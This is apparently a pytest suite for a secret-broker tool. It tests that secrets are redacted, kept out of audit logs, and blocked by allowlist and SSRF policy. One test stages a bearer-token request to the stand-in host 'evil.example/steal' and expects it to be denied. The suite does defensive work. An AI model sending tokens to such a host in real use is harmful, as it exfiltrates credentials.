import json
from pathlib import Path

import httpx
import pytest

from secret_broker.adapters.memory import MemoryAdapter
from secret_broker.audit import AuditLog
from secret_broker.broker import Broker
from secret_broker.config import BrokerConfig
from secret_broker.policy import Policy, PolicyDenied


@pytest.fixture
def broker(tmp_path: Path) -> Broker:
    mem = MemoryAdapter(name="memory")
    mem.put("TOKEN", "tok_LIVE_abc123XYZ")
    policy = Policy(
        default_deny_hosts=True,
        allowed_hosts={"example.com", "httpbin.org"},
        allowed_bins={"python3", "echo", "true"},
    )
    cfg = BrokerConfig(
        audit_path=str(tmp_path / "audit.jsonl"),
        policy_path=str(tmp_path / "policy.toml"),
        stores={"memory": {"type": "memory"}},
    )
    return Broker(
        config=cfg,
        adapters={"memory": mem},
        policy=policy,
        audit=AuditLog(cfg.audit_path),
        actor="test",
    )


def test_list_and_describe_never_include_values(broker: Broker):
    metas = broker.list()
    assert metas[0].name == "TOKEN"
    assert "tok_LIVE" not in json.dumps(metas[0].model_dump())
    desc = broker.describe("secret://memory/TOKEN")
    assert "tok_LIVE" not in json.dumps(desc.model_dump())


def test_run_injects_and_redacts(broker: Broker):
    result = broker.run(
        ["python3", "-c", "import os; print(os.environ['TOKEN'])"],
        env_refs={"TOKEN": "secret://memory/TOKEN"},
    )
    assert result.exit_code == 0
    assert "tok_LIVE_abc123XYZ" not in result.stdout
    assert "[REDACTED]" in result.stdout
    assert result.redacted


def test_policy_denies_off_allowlist_host(broker: Broker, monkeypatch):
    def boom(*_a, **_k):
        raise AssertionError("httpx should not be called when policy denies")

    monkeypatch.setattr(httpx.Client, "request", boom)
    with pytest.raises(PolicyDenied):
        broker.call(
            url="https://evil.example/steal",
            ref_str="secret://memory/TOKEN",
            method="GET",
            inject="bearer",
        )


def test_policy_denies_disallowed_bin(broker: Broker):
    with pytest.raises(PolicyDenied):
        broker.run(
            ["nmap", "-h"],
            env_refs={"TOKEN": "secret://memory/TOKEN"},
        )


def test_ssrf_blocks_localhost(broker: Broker):
    broker.policy.allow_host("127.0.0.1")
    with pytest.raises(PolicyDenied, match="SSRF"):
        broker.call(
            url="http://127.0.0.1:9/",
            ref_str="secret://memory/TOKEN",
        )


def test_call_redacts_echoed_secret(broker: Broker, monkeypatch):
    secret = "tok_LIVE_abc123XYZ"

    class FakeResp:
        status_code = 200
        text = f'{{"auth":"{secret}"}}'
        headers: dict[str, str]

        def __init__(self) -> None:
            self.headers = {"content-type": "application/json"}
            self.text = f'{{"auth":"{secret}"}}'

    class FakeClient:
        def __init__(self, *a, **k):
            pass

        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

        def request(self, *a, **k):
            return FakeResp()

    monkeypatch.setattr(httpx, "Client", FakeClient)
    result = broker.call(
        url="https://example.com/v1",
        ref_str="secret://memory/TOKEN",
        inject="bearer",
    )
    assert secret not in result.body
    assert result.redacted
    assert result.status_code == 200


def test_audit_has_no_value_field(broker: Broker, tmp_path: Path):
    broker.run(
        ["python3", "-c", "print('ok')"],
        env_refs={"TOKEN": "secret://memory/TOKEN"},
    )
    events = broker.audit_tail()
    assert events
    dumped = events[-1].model_dump()
    assert "value" not in dumped
    raw = Path(broker.config.audit_path).read_text()
    assert "tok_LIVE_abc123XYZ" not in raw


def test_doctor_leak_check(broker: Broker):
    report = broker.doctor()
    assert report["ok"]
    leak = next(c for c in report["checks"] if c["name"] == "leak_self_check")
    assert leak["ok"]


def test_broker_has_no_get_or_reveal(broker: Broker):
    assert not hasattr(broker, "get")
    assert not hasattr(broker, "reveal")
    assert not hasattr(broker, "get_secret")
